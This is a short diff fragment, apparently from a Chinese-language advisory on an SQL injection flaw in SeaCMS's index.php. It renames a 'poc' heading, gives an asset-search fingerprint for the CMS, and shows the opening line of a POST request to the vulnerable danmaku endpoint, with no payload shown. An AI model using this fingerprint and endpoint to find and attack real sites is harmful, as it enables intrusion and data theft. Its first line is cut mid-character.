@@ -8,7 +8,7 @@ SeaCMS海洋影视管理系统index.php存在SQL注入漏洞，攻击者可获�
 app="海洋CMS"
 ```
 
-## poc
+## POC
 
 ```java
 POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
